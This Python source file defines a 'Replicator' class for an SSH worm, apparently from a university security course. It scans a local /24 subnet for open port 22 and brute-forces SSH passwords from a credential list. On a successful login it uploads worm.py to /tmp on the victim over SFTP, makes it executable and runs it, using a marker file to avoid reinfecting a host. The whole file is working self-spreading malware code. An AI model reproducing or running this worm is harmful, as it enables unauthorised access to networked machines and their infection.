import paramiko
import nmap
import socket
import os

class Replicator(object):

	# The file marking whether the worm should spread
	INFECTED_MARKER_FILE = "/tmp/infected.txt"

	# Connection indicators
	SUCCESSFUL_CONNECTION = 0
	BAD_CREDENTIALS = 1
	CONNECTION_ERROR = 3

	sshClient = None
	credentialList = None

	def __init__(self, credList):
		self.credentialList = credList
		self.sshClient = paramiko.SSHClient()
		self.sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	def spreadAndExecute(self):
		sftpClient = self.sshClient.open_sftp()

		sftpClient.put("worm.py", "/tmp/" + "worm.py")
	
		self.sshClient.exec_command("chmod a+x /tmp/worm.py")

		# self.sshClient.exec_command("nohup python /tmp/worm.py &")
		self.sshClient.exec_command("python /tmp/worm.py")

	def tryCredentials(self, host, username, password):
		try:
			self.sshClient.connect(host, username=username, password=password)

		except socket.error:
			print('ERROR: Connection error...')
			return Replicator.CONNECTION_ERROR
		except paramiko.SSHException:
			print('ERROR: Bad credentials...')
			return Replicator.BAD_CREDENTIALS

		return Replicator.SUCCESSFUL_CONNECTION

	def attackSystem(self, host):

		attemptResults = None

		for (username, password) in self.credentialList:

			attemptResults = self.tryCredentials(host, username, password)

			print('(' + username + ', ' + password + '): ' + str(attemptResults))

			if attemptResults == Replicator.SUCCESSFUL_CONNECTION:
				return (attemptResults, self.sshClient) # Possibly need a copy of the instance?

		return (attemptResults, None)

	def remoteSystemIsInfected(self):
		sftpClient = self.sshClient.open_sftp()

		try:
			sftpClient.get(Replicator.INFECTED_MARKER_FILE, '/home/cpsc/')
		except IOError:
			print("This system should be infected")
			return False

		return True

	@staticmethod
	def isInfectedSystem():
		return os.path.isfile(Replicator.INFECTED_MARKER_FILE)

	@staticmethod
	def markInfected():
		open(Replicator.INFECTED_MARKER_FILE, 'a').close()

	@staticmethod
	def getMyIP():
		# Using other method for getting current IP. Original example given in the sample
		# code was generating errors.
		return socket.gethostbyname(socket.gethostname())

	@staticmethod
	def getHostsOnTheSameNetwork():
		
		portScanner = nmap.PortScanner()

		portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

		# Scan the network for hosts
		hostInfo = portScanner.all_hosts()

		# Hosts that are alive
		runningHosts = []

		for host in hostInfo:
			if portScanner[host].state() == "up":
				runningHosts.append(host)

		return runningHosts
